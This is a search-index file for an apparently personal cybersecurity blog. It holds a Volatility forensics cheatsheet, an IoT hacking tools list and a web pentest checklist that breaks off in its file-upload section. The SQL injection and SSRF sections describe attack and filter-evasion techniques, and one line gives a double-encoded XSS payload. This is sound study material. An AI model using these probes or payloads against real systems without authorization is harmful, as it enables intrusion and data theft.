{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#whoami","title":"$ whoami","text":"<p>Hai, welcome to my personal blog. Currently studying computer networks and very passionate in cybersecurity industry. Just nubis kubis person that always eager on new knowledge. Primarily focusing on pentesting, crypto and forensics.</p> <p> </p>"},{"location":"tags/","title":"Tags","text":"<p>Following is a list of relevant tags:</p>"},{"location":"tags/#cheatsheet","title":"cheatsheet","text":"<ul> <li>Cheatsheet</li> <li>Volatility</li> <li>Tools</li> <li>Web pentest checklist</li> </ul>"},{"location":"tags/#cve","title":"cve","text":"<ul> <li>Analytics</li> <li>Codify</li> </ul>"},{"location":"tags/#enum4linux","title":"enum4linux","text":"<ul> <li>Codify</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#ftp","title":"ftp","text":"<ul> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#gobuster","title":"gobuster","text":"<ul> <li>Analytics</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#gtfobins","title":"gtfobins","text":"<ul> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#hashcat","title":"hashcat","text":"<ul> <li>Codify</li> </ul>"},{"location":"tags/#hydra","title":"hydra","text":"<ul> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#john","title":"john","text":"<ul> <li>Codify</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#linpeas","title":"linpeas","text":"<ul> <li>Analytics</li> <li>Codify</li> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#pspy64","title":"pspy64","text":"<ul> <li>Codify</li> </ul>"},{"location":"tags/#ssh-key","title":"ssh-key","text":"<ul> <li>Basic Pentesting</li> </ul>"},{"location":"notes/cryptography/cheatsheet/","title":"Cheatsheet","text":"<p>https://www.insecure.in/cryptography-cheat-sheet</p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/","title":"Volatility","text":"","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#listing-processes","title":"Listing Processes","text":"<pre><code>windows.pslist.PsList\n    Lists the processes present in a particular windows memory image.\n\nwindows.psscan.PsScan\n    Scans for processes present in a particular windows memory image.\n\nwindows.pstree.PsTree\n    Plugin for listing processes in a tree based on their parent process ID.\n\ni.e:\npython vol.py -f memdump.raw windows.pslist # Get process list (EPROCESS)\npython vol.py -f memdump.raw windows.psscan # Get hidden process list(malware)\npython vol.py -f memdump.raw windows.pstree # Get processes tree (not hidden)\npython vol.py -f memdump.raw windows.pslist --pid &lt;pid&gt; --dump # Get only the .exe and no handles/dlls\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#checking-cmd-commands","title":"Checking CMD commands","text":"<pre><code>windows.cmdline.CmdLine \n        Lists process command line arguments.\ni.e:\npython vol.py -f memdump.raw windows.cmdline\n</code></pre> <p>Commands entered into cmd.exe are processed by conhost.exe (csrss.exe prior to Windows 7). So even if an attacker managed to kill the cmd.exe prior to us obtaining a memory dump, there is still a good chance of recovering history of the command line session from conhost.exe\u2019s memory. If you find something weird (using the console's modules), try to dump the memory of the conhost.exe associated process and search for strings inside it to extract the command lines.</p> <p>- Hacktricks</p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#network-information","title":"Network Information","text":"<pre><code>windows.netscan.NetScan\n    Scans for network objects present in a particular windows memory image.\n\nwindows.netstat.NetStat\n    Traverses network tracking structures present in a particular windows memory image.\n\ni.e:\npython vol.py -f memdump.raw windows.netscan\npython vol.py -f memdump.raw windows.netstat\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#checking-dll-used","title":"Checking DLL Used","text":"<pre><code>windows.dlllist.DllList\n    Lists the loaded modules in a particular windows memory image.\n\ni.e \npython vol.py -f memdump.raw windows.dlllist [--pid &lt;pid&gt;]\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#getting-hashespasswords","title":"Getting Hashes/Passwords","text":"<pre><code>windows.cachedump.Cachedump\n    Dumps lsa secrets from memory\n\nwindows.hashdump.Hashdump\n    Dumps user hashes from memory\n\nwindows.lsadump.Lsadump\n    Dumps lsa secrets from memory\n\ni.e\npython vol.py -f memdump.raw windows.cachedump \npython vol.py -f memdump.raw windows.hashdump\npython vol.py -f memdump.raw windows.lsadump\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#getting-sids","title":"Getting SIDs","text":"<pre><code>windows.getservicesids.GetServiceSIDs\n    Lists process token sids.\n\nwindows.getsids.GetSIDs\n    Print the SIDs owning each process\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#registry","title":"Registry","text":"<pre><code>windows.registry.hivelist.HiveList\n    Lists the registry hives present in a particular memory image.\n\nwindows.registry.hivescan.HiveScan\n    Scans for registry hives present in a particular windows memory image.\n\nwindows.registry.printkey.PrintKey\n    Lists the registry keys under a hive or specific key value.\n\n\ni.e\npython vol.py -f file.dmp windows.registry.printkey.PrintKey --key \"Software\\Microsoft\\Windows NT\\CurrentVersion\" #Hacktricks\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#certificates-in-registry","title":"Certificates in Registry","text":"<pre><code>windows.registry.certificates.Certificates\n    Lists the certificates in the registry's Certificate Store.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#user-assist","title":"User Assist","text":"<p>Enter Explanation Here <pre><code>windows.registry.userassist.UserAssist\n    Print userassist registry keys and information.\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#malware-hunting","title":"Malware Hunting","text":"<pre><code>windows.driverirp.DriverIrp\n    List IRPs for drivers in a particular windows memory image.\n    #Checks for hooks done by malware\n\nwindows.malfind.Malfind\n    Lists process memory ranges that potentially contain injected code.\n    #Usually shows process injection/DLL injection.\n\nwindows.ldrmodules.LdrModules\n    Displays loaded modules/DLL in the memory.\n    #Can be used to detect DLL injection, especially when all 3 are false.\n\nwindows.drivermodule.DriverModule\n    Determines if any loaded drivers were hidden by a rootkit\n\nwindows.ssdt.SSDT   \n    Lists the system call table.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#environmental-variables","title":"Environmental Variables","text":"<pre><code>windows.envars.Envars\n    Display process environment variables\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#file-related-commands","title":"File Related Commands","text":"<pre><code>windows.dumpfiles.DumpFiles\n    Dumps cached file contents from Windows memory samples.\n\nwindows.filescan.FileScan\n    Scans for file objects present in a particular windows memory image.\n\ni.e\npython vol.py -f memdump.raw windows.dumpfiles #Dumps everything\npython vol.py -f memdump.raw windows.dumpfiles --pid &lt;PID&gt; #Dumps .exe and its handles\npython vol.py -f memdump.raw windows.dumpfiles --physaddr &lt;offset&gt;\npython vol.py -f memdump.raw windows.dumpfiles --virtaddr &lt;offset&gt;\npython vol.py -f memdump.raw windows.filescan\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#mft-mbr-records","title":"MFT &amp; MBR Records","text":"<p>Enter About MFT &amp; MBR here <pre><code>windows.mftscan.MFTScan\n    Scans for MFT FILE objects present in a particular windows memory image.\n\nwindows.mbrscan.MBRScan\n    Scans for and parses potential Master Boot Records (MBRs)\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#device-and-drivers","title":"Device and Drivers","text":"<pre><code>windows.devicetree.DeviceTree\n    Listing tree based on drivers and attached devices in a particular windows memory image.\n\nwindows.driverscan.DriverScan\n    Scans for drivers present in a particular windows memory image.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#handles","title":"Handles","text":"<p>Explanation about brief Handles <pre><code>windows.handles.Handles\n    Lists process open handles.\n\ni.e\npython vol.py -f memdump.raw windows.handles [--pid &lt;pid&gt;]\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#computer-information","title":"Computer Information","text":"<pre><code>windows.crashinfo.Crashinfo\n\nwindows.info.Info\n    Show OS &amp; kernel details of the memory sample being analyzed.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#token-privileges","title":"Token Privileges","text":"<p>Explanation about privileges <pre><code>windows.privileges.Privs\n    Lists process token privileges\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#mutex-scans","title":"Mutex Scans","text":"<p>Explanation about Mutexes <pre><code>windows.mutantscan.MutantScan\n    Scans for mutexes present in a particular windows memory image.\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#sessions","title":"Sessions","text":"<p>Sesssions explnaation <pre><code>windows.sessions.Sessions\n    lists Processes with Session information extracted from Environmental Variables\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#services","title":"Services","text":"<pre><code>windows.svcscan.SvcScan\n    Scans for windows services.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#symlinks","title":"Symlinks","text":"<pre><code>windows.symlinkscan.SymlinkScan\n    Scans for links present in a particular windows memory image.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#yara-related","title":"Yara-Related","text":"<pre><code>windows.vadyarascan.VadYaraScan\n    Scans all the Virtual Address Descriptor memory maps using yara.\n\nyarascan.YaraScan   \n    Scans kernel memory using yara rules (string or file).\n\ni.e\npython vol.py -f memdump.py windows.vadyarascan --yara-rules \"http://\" --pid &lt;pid&gt;\npython vol.py -f memdump.py yarascan --yara-rules \"ftp://\"\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#vad-related","title":"Vad Related","text":"<pre><code>windows.vadinfo.VadInfo\n    Lists process memory ranges.\n\nwindows.vadwalk.VadWalk\n    Walk the VAD tree.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#niche-use-case","title":"Niche Use case","text":"<pre><code>windows.skeleton_key_check.Skeleton_Key_Check\n    Looks for signs of Skeleton Key malware\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#still-unsure","title":"Still Unsure","text":"<pre><code>windows.bigpools.BigPools\n    List big page pools\n\nwindows.poolscanner.PoolScanner\n    A generic pool scanner plugin.\n\nwindows.statistics.Statistics\n\nwindows.joblinks.JobLinks\n    Print process job link information\n\nwindows.callbacks.Callbacks\n    Lists kernel callbacks and notification routines.\n\nwindows.memmap.Memmap\n    Prints the memory map\n\nwindows.modscan.ModScan\n    Scans for modules present in a particular windows memory image.\n\nwindows.modules.Modules\n    Lists the loaded kernel modules.\n\nwindows.strings.Strings\n    Reads output from the strings command and indicates which process(es) each string belongs to.\n\nwindows.verinfo.VerInfo\n    Lists version information from PE files.\n\nwindows.virtmap.VirtMap\n    Lists virtual mapped sections.\n</code></pre> <p>EVTExtract <pre><code>C:/Python27/Scripts/evtxtract.exe   Z:/evidence/1/image.dd   &gt;   Z:/work/1/evtx.xml\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/","title":"Tools","text":"","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/#software-tools","title":"Software Tools","text":"<ul> <li> <p>Analysis Frameworks</p> <ul> <li>EXPLIoT - Pentest framework like Metasploit but specialized for IoT.</li> <li>FACT - The Firmware Analysis and Comparison Tool - Full-featured static analysis framework including extraction of firmware, analysis utilizing different plug-ins and comparison of different firmware versions.</li> <li>Improving your firmware security analysis process with FACT - Conference talk about FACT \ud83d\udcfa.</li> <li>FwAnalyzer - Analyze security of firmware based on customized rules. Intended as additional step in DevSecOps, similar to CI.</li> <li>HAL \u2013 The Hardware Analyzer - A comprehensive reverse engineering and manipulation framework for gate-level netlists.</li> <li>HomePWN - Swiss Army Knife for Pentesting of IoT Devices.</li> <li>IoTSecFuzz - Framework for automatisation of IoT layers security analysis: hardware, software and communication.</li> <li>Killerbee - Framework for Testing &amp; Auditing ZigBee and IEEE 802.15.4 Networks.</li> <li>PRET - Printer Exploitation Toolkit.</li> <li>Routersploit - Framework dedicated to exploit embedded devices.</li> </ul> </li> <li> <p>Analysis Tools</p> <ul> <li>Binwalk - Searches a binary for \"interesting\" stuff, as well as extracts arbitrary files.</li> <li>emba - Analyze Linux-based firmware of embedded devices.</li> <li>Firmadyne - Tries to emulate and pentest a firmware.</li> <li>Firmwalker - Searches extracted firmware images for interesting files and information.</li> <li>Firmware Slap - Discovering vulnerabilities in firmware through concolic analysis and function clustering.</li> <li>Ghidra - Software Reverse Engineering suite; handles arbitrary binaries, if you provide CPU architecture and endianness of the binary.</li> <li>Radare2 - Software Reverse Engineering framework, also handles popular formats and arbitrary binaries, has an extensive command line toolset.</li> <li>Trommel - Searches extracted firmware images for interesting files and information.</li> </ul> </li> <li> <p>Extraction Tools</p> <ul> <li>FACT Extractor - Detects container format automatically and executes the corresponding extraction tool.</li> <li>Firmware Mod Kit - Extraction tools for several container formats.</li> <li>The SRecord package - Collection of tools for manipulating EPROM files (can convert lots of binary formats).</li> </ul> </li> <li> <p>Support Tools</p> <ul> <li>JTAGenum - Add JTAG capabilities to an Arduino.</li> <li>OpenOCD - Free and Open On-Chip Debugging, In-System Programming and Boundary-Scan Testing.</li> </ul> </li> <li> <p>Misc Tools</p> <ul> <li>Cotopaxi - Set of tools for security testing of Internet of Things devices using specific network IoT protocols.</li> <li>dumpflash - Low-level NAND Flash dump and parsing utility.</li> <li>flashrom - Tool for detecting, reading, writing, verifying and erasing flash chips.</li> <li>Samsung Firmware Magic - Decrypt Samsung SSD firmware updates.</li> </ul> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/#hardware-tools","title":"Hardware Tools","text":"<ul> <li>Bus Blaster - Detects and interacts with hardware debug ports like UART and JTAG.</li> <li>Bus Pirate - Detects and interacts with hardware debug ports like UART and JTAG.</li> <li>Shikra - Detects and interacts with hardware debug ports like UART and JTAG. Among other protocols.</li> <li>JTAGULATOR - Detects JTAG Pinouts fast.</li> <li>Saleae - Easy to use Logic Analyzer that support many protocols \ud83d\udcb6.</li> <li>Ikalogic - Alternative to Saleae logic analyzers \ud83d\udcb6.</li> <li>HydraBus - Open source multi-tool hardware similar to the BusPirate but with NFC capabilities.</li> <li>ChipWhisperer - Detects Glitch/Side-channel attacks.</li> <li>Glasgow - Tool for exploring and debugging different digital interfaces.</li> <li>J-Link - J-Link offers USB powered JTAG debug probes for multiple different CPU cores \ud83d\udcb6.</li> <li> <p>Bluetooth BLE Tools</p> <ul> <li>UberTooth One - Open source 2.4 GHz wireless development platform suitable for Bluetooth experimentation.</li> <li>Bluefruit LE Sniffer - Easy to use Bluetooth Low Energy sniffer.</li> </ul> </li> <li> <p>ZigBee Tools</p> <ul> <li>ApiMote - ZigBee security research hardware for learning about and evaluating the security of IEEE 802.15.4/ZigBee systems. Killerbee compatible.</li> <li>Atmel RZUSBstick - Discontinued product. Lucky if you have one! - Tool for development, debugging and demonstration of a wide range of low power wireless applications including IEEE 802.15.4, 6LoWPAN, and ZigBee networks. Killerbee compatible.</li> <li>Freakduino - Low Cost Battery Operated Wireless Arduino Board that can be turned into a IEEE 802.15.4 protocol sniffer.</li> </ul> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/#sdr-tools","title":"SDR Tools","text":"<ul> <li>RTL-SDR - Cheapest SDR for beginners. It is a computer based radio scanner for receiving live radio signals frequencies from 500 kHz up to 1.75 GHz.</li> <li>HackRF One - Software Defined Radio peripheral capable of transmission or reception of radio signals from 1 MHz to 6 GHz (half-duplex).</li> <li>YardStick One - Half-duplex sub-1 GHz wireless transceiver.</li> <li>LimeSDR - Software Defined Radio peripheral capable of transmission or reception of radio signals from 100 KHz to 3.8 GHz (full-duplex).</li> <li>BladeRF 2.0 - Software Defined Radio peripheral capable of transmission or reception of radio signals from 47 MHz to 6 GHz (full-duplex).</li> <li>USRP B Series - Software Defined Radio peripheral capable of transmission or reception of radio signals from 70 MHz to 6 GHz (full-duplex).</li> </ul>","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/#rfid-nfc-tools","title":"RFID NFC Tools","text":"<ul> <li>Proxmark 3 RDV4 - Powerful general purpose RFID tool. From Low Frequency (125kHz) to High Frequency (13.56MHz) tags.</li> <li>ChamaleonMini - Programmable, portable tool for NFC security analysis.</li> <li>HydraNFC - Powerful 13.56MHz RFID / NFC platform. Read / write / crack / sniff / emulate.</li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/","title":"Web pentest checklist","text":"","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#cookie-settings","title":"Cookie Settings","text":"<ul> <li> <p>Insecure transmission: Ensure cookies are sent only over HTTPS connections, to prevent interception by attackers. Set the \"Secure\" attribute for all cookies.</p> </li> <li> <p>Missing HttpOnly attribute: Set the \"HttpOnly\" attribute to ensure cookies are inaccessible to client-side scripts, reducing the risk of cross-site scripting (XSS) attacks.</p> </li> <li> <p>Missing SameSite attribute: Set the \"SameSite\" attribute to \"Strict\" or \"Lax\" to prevent cross-site request forgery (CSRF) attacks by ensuring cookies are only sent with requests originating from the same domain.</p> </li> <li> <p>Excessive cookie lifetime: Limit the duration of cookie validity by setting the \"Expires\" or \"Max-Age\" attribute. Long-lived cookies pose a greater risk if they are compromised.</p> </li> <li> <p>Weak encryption: Use strong encryption algorithms and up-to-date cryptographic libraries to protect sensitive information stored in cookies.</p> </li> <li> <p>Insufficiently random session IDs: Ensure session IDs are generated using a strong source of randomness, to prevent session hijacking and guessing attacks.</p> </li> <li> <p>Overly permissive cookie domain and path: Limit the scope of cookies by setting the \"Domain\" and \"Path\" attributes to specific subdomains or directories, reducing the risk of unauthorized access.</p> </li> <li> <p>Storing sensitive information in cookies: Avoid storing sensitive information, such as passwords, API keys, or personally identifiable information (PII) in cookies. Instead, store them server-side and use session IDs to reference the data.</p> </li> <li> <p>Unprotected cookie values: Ensure that cookie values are hashed, encrypted, or signed to protect them from being tampered with by attackers.</p> </li> <li> <p>Inadequate monitoring and logging: Implement a proper monitoring and logging system to track cookie usage, to help detect and respond to potential security incidents.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#ssrf","title":"SSRF","text":"<ul> <li> <p>Test user-controlled URLs: Identify user-controlled URL inputs and test them with external URLs to see if the server fetches or processes them.</p> </li> <li> <p>Test internal IP addresses: Attempt to access internal IP addresses (e.g., 127.0.0.1 or 10.0.0.0/8) or services through user-controlled inputs to check if the server processes them.</p> </li> <li> <p>Use URL schemas: Test various URL schemas, such as file://, ftp://, or gopher://, to bypass input validation or access internal resources.</p> </li> <li> <p>Test domain resolution: Test if your server resolves domain names to internal IP addresses by using a domain that points to an internal IP address.</p> </li> <li> <p>Test URL redirection: Test if the server follows redirects by supplying a URL that redirects to an internal or external resource.</p> </li> <li> <p>Test with different HTTP methods: Test SSRF vulnerabilities with various HTTP methods, such as GET, POST, PUT, DELETE, or HEAD.</p> </li> <li> <p>Test with malformed URLs: Test with malformed URLs that may bypass input validation, such as using @ to separate credentials or adding extra slashes.</p> </li> <li> <p>Test for open ports: Attempt to access open ports on the server or internal network by specifying the target IP and port in the URL.</p> </li> <li> <p>Test for Out-of-Band (OOB) data exfiltration: Test if the server can send data to an external domain you control, which may indicate an SSRF vulnerability.</p> </li> <li> <p>Test for cloud service metadata: If your site is hosted on a cloud provider, test if the server can access cloud service metadata endpoints, which may expose sensitive information.</p> </li> <li> <p>Test with time-based techniques: Use time-based techniques, such as delays or timeouts, to confirm SSRF vulnerabilities when the server response doesn't reveal the fetched content.</p> </li> <li> <p>Test for protocol smuggling: Test for protocol smuggling, such as using http:// within an https:// URL, to bypass input validation or access internal resources.</p> </li> <li> <p>Test for bypassing URL filtering: Attempt to bypass URL filtering using techniques like URL encoding, double encoding, or mixed case encoding.</p> </li> <li> <p>Use web application scanners: Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential SSRF vulnerabilities.</p> </li> <li> <p>Test with IPv6 addresses: Test for SSRF vulnerabilities using IPv6 addresses to bypass input validation or access internal resources.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#waf-testing","title":"WAF Testing","text":"<ul> <li> <p>Test with OWASP Top Ten attacks: Test for the most common web application vulnerabilities, such as SQLi, XSS, CSRF, and RCE.</p> </li> <li> <p>Use WAF testing tools: Utilize tools like Wafw00f, Nmap, or WAPT to identify and test your WAF's capabilities.</p> </li> <li> <p>Test for HTTP methods: Test different HTTP methods (GET, POST, PUT, DELETE, etc.) to check if your WAF is properly filtering and blocking malicious requests.</p> </li> <li> <p>Test for HTTP protocol violations: Send requests that violate the HTTP protocol to see if your WAF can detect and block them.</p> </li> <li> <p>Test with malformed requests: Send malformed requests with invalid or unexpected characters, encoding, or headers to test if your WAF can detect and block them.</p> </li> <li> <p>Test for evasion techniques: Test various evasion techniques, such as URL encoding, double encoding, or using mixed case, to bypass input filters and WAF rules.</p> </li> <li> <p>Test for IP and user agent blocking: Test if your WAF can block specific IPs or user agents, and check for bypass techniques using proxies or fake user agents.</p> </li> <li> <p>Test for rate limiting: Test if your WAF can enforce rate limiting and block requests that exceed the allowed rate.</p> </li> <li> <p>Test for cookie security: Test if your WAF can detect and block cookie manipulation, such as injecting malicious code or altering session cookies.</p> </li> <li> <p>Test for file upload vulnerabilities: Test if your WAF can detect and block malicious file uploads, such as uploading web shells or malware.</p> </li> <li> <p>Test for known attack signatures: Test your WAF's ability to detect and block known attack signatures using tools like Burp Suite or OWASP ZAP.</p> </li> <li> <p>Test custom WAF rules: Test custom WAF rules and configurations to ensure they properly block malicious requests.</p> </li> <li> <p>Test for false positives: Ensure your WAF doesn't block legitimate traffic by testing with common requests and inputs that may trigger false positives.</p> </li> <li> <p>Test for false negatives: Ensure your WAF doesn't allow malicious traffic by testing with known attack vectors that should trigger blocking.</p> </li> <li> <p>Test for SSL/TLS vulnerabilities: Test if your WAF can detect and block SSL/TLS vulnerabilities, such as POODLE or Heartbleed.</p> </li> <li> <p>Test for XML vulnerabilities: Test if your WAF can detect and block XML-based attacks, such as XXE or XEE.</p> </li> <li> <p>Test for header injection: Test if your WAF can detect and block header injection attacks, such as CRLF injection or response splitting.</p> </li> <li> <p>Test for path traversal attacks: Test if your WAF can detect and block path traversal attacks, such as directory traversal or file inclusion.</p> </li> <li> <p>Test for application-layer DDoS attacks: Test if your WAF can detect and block application-layer DDoS attacks, such as Slowloris or RUDY.</p> </li> <li> <p>Perform continuous testing and monitoring: Regularly test your WAF's effectiveness and monitor its logs to detect and block new attack vectors and emerging threats.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#header-vulnerability","title":"Header Vulnerability","text":"<ul> <li> <p>Missing Strict-Transport-Security (HSTS) header: Enables HTTPS-only communication, preventing man-in-the-middle attacks.</p> </li> <li> <p>Missing X-Content-Type-Options header: Disables MIME type sniffing, reducing the risk of attacks using MIME confusion.</p> </li> <li> <p>Missing X-Frame-Options header: Prevents clickjacking attacks by disallowing or limiting the site from being embedded within frames.</p> </li> <li> <p>Missing Content-Security-Policy (CSP) header: Defines allowed sources of content, reducing the risk of cross-site scripting (XSS) and content injection attacks.</p> </li> <li> <p>Missing X-XSS-Protection header: Activates built-in browser protection against cross-site scripting (XSS) attacks.</p> </li> <li> <p>Missing Referrer-Policy header: Controls the information sent in the Referer header, protecting user privacy and reducing the risk of information leakage.</p> </li> <li> <p>Missing Feature-Policy header: Restricts the use of certain browser features and APIs, improving security and privacy.</p> </li> <li> <p>Insecure CORS (Cross-Origin Resource Sharing) settings: Allows unauthorized domains to access resources, increasing the risk of cross-site request forgery (CSRF) and data leakage.</p> </li> <li> <p>Missing Expect-CT header: Enforces Certificate Transparency, reducing the risk of misissued SSL/TLS certificates.</p> </li> <li> <p>Missing Permissions-Policy header: Defines which browser features are allowed or denied, enhancing user privacy and security.</p> </li> <li> <p>Weak or missing Public-Key-Pins (HPKP) header: Ensures the use of specific cryptographic public keys, reducing the risk of man-in-the-middle attacks using rogue certificates.</p> </li> <li> <p>Missing X-Download-Options header: Prevents file download prompts from being displayed, reducing the risk of drive-by download attacks.</p> </li> <li> <p>Missing X-Permitted-Cross-Domain-Policies header: Restricts the loading of content from other domains, reducing the risk of data theft.</p> </li> <li> <p>Missing X-DNS-Prefetch-Control header: Controls DNS prefetching, potentially improving user privacy.</p> </li> <li> <p>Inadequate Cache-Control settings: Insecure caching settings can expose sensitive information or allow unauthorized access to content.</p> </li> <li> <p>Missing X-Content-Duration header: Helps prevent unauthorized media access by specifying the duration of media files.</p> </li> <li> <p>Missing Access-Control-Allow-Origin header: Improper configuration can result in unauthorized cross-origin resource sharing.</p> </li> <li> <p>Missing X-WebKit-CSP header: This older header is used by some legacy browsers for content security policy enforcement.</p> </li> <li> <p>Missing X-Content-Security-Policy header: Similar to X-WebKit-CSP, this older header is used by some legacy browsers for content security policy enforcement.</p> </li> <li> <p>Missing X-XContent-Type-Options header: Disables MIME sniffing on older browsers, reducing the risk of MIME confusion attacks.</p> </li> <li> <p>Insecure ETag settings: Weak ETag settings can cause caching issues, potentially exposing sensitive information.</p> </li> <li> <p>Missing or weak Content-Encoding header: Properly configuring this header helps protect against attacks that rely on manipulating content encoding.</p> </li> <li> <p>Missing or weak Content-Language header: Properly configuring this header helps protect against attacks that rely on manipulating content language.</p> </li> <li> <p>Missing or weak Last-Modified header: Properly configuring this header helps protect against attacks that rely on manipulating content modification timestamps.</p> </li> <li> <p>Insecure or missing Cookie headers: As mentioned in the previous answer, insecure cookie settings can lead to various security vulnerabilities.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#sql-injection","title":"SQL Injection","text":"<ul> <li> <p>Single quote test: Inject a single quote ' into input fields and observe if it generates an error or unexpected behavior, which might indicate a potential SQLi vulnerability.</p> </li> <li> <p>Tautologies: Inject tautologies like 1=1 or a=a into input fields or URL parameters to test for boolean-based SQLi.</p> </li> <li> <p>Union-based SQLi: Use the UNION operator to combine the results of two or more SELECT statements and extract data from other tables.</p> </li> <li> <p>Error-based SQLi: Inject incorrect syntax or invalid input to trigger error messages that reveal database structure or sensitive information.</p> </li> <li> <p>Time-based SQLi: Inject time-delaying functions like SLEEP() or WAITFOR DELAY to test for time-based SQLi vulnerabilities.</p> </li> <li> <p>Out-of-band (OOB) SQLi: Test for OOB SQLi by injecting payloads that cause the database to make external requests, such as DNS lookups or HTTP requests, to exfiltrate data.</p> </li> <li> <p>Double encoding: Test with double-encoded payloads to bypass filters that only decode input once. Example: %253Cscript%253Ealert(1)%253C%252Fscript%253E.</p> </li> <li> <p>Use SQL comment characters: Inject SQL comment characters (--, /, /) to bypass input filters or terminate SQL statements.</p> </li> <li> <p>Manipulate query logic: Inject logical operators such as AND or OR to manipulate the query's logic and bypass access controls.</p> </li> <li> <p>Test with different SQL dialects: Use payloads specific to different SQL dialects (e.g., MySQL, PostgreSQL, Oracle, or MSSQL) to identify database-specific vulnerabilities.</p> </li> <li> <p>Test various HTTP methods: Test for SQLi vulnerabilities using different HTTP methods, such as POST, PUT, or PATCH, with SQLi payloads.</p> </li> <li> <p>Test with URL-encoded or base64-encoded parameters: Try URL-encoded or base64-encoded parameters to bypass input validation or access control checks.</p> </li> <li> <p>Test various content types: Test for SQLi vulnerabilities in different content types that support user input, such as JSON, XML, or URL-encoded form data.</p> </li> <li> <p>Manipulate cookies: Inject SQL payloads into cookies to test if the application processes them in an unsafe manner.</p> </li> <li> <p>Use web application scanners: Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential SQLi vulnerabilities.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#tls-vulnerability","title":"TLS Vulnerability","text":"<ul> <li> <p>Weak or outdated SSL/TLS protocols: Ensure your site only supports secure and up-to-date protocols like TLS 1.2 and TLS 1.3, and disable insecure ones like SSL 2.0, SSL 3.0, and TLS 1.0.</p> </li> <li> <p>Insecure cipher suites: Disable weak cipher suites and use strong ones, such as those based on AES-GCM, ChaCha20-Poly1305, or ECDHE (Elliptic Curve Diffie-Hellman).</p> </li> <li> <p>Vulnerability to known attacks: Protect your site from known TLS attacks, such as POODLE, BEAST, CRIME, BREACH, or Heartbleed, by applying security patches and following best practices.</p> </li> <li> <p>Inadequate certificate management: Use a valid, trusted, and up-to-date SSL/TLS certificate from a reputable Certificate Authority (CA). Regularly check for certificate expiration and renewals.</p> </li> <li> <p>Insufficient certificate chain validation: Ensure proper validation of the certificate chain to prevent man-in-the-middle attacks using rogue or misissued certificates.</p> </li> <li> <p>Weak or missing public key pinning: Implement HTTP Public Key Pinning (HPKP) or Certificate Transparency to enforce the use of specific public keys and reduce the risk of man-in-the-middle attacks.</p> </li> <li> <p>Mixed content: Ensure that all content, including images, stylesheets, and scripts, are served over HTTPS to prevent mixed content warnings and potential attacks.</p> </li> <li> <p>Insecure renegotiation: Disable insecure client-initiated renegotiation to protect your site from man-in-the-middle attacks exploiting this vulnerability.</p> </li> <li> <p>Insufficient forward secrecy: Use cipher suites that support forward secrecy, such as ECDHE or DHE, to protect past communications from being decrypted even if the server's private key is compromised.</p> </li> <li> <p>Lack of OCSP stapling: Implement OCSP (Online Certificate Status Protocol) stapling to reduce the latency of SSL/TLS handshakes and provide real-time certificate revocation information.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#file-upload","title":"File Upload","text":"<ul> <li> <p>File size limit: Verify that there is an appropriate file size limit in place to prevent large file uploads that could potentially exhaust server resources.</p> </li> <li> <p>File type 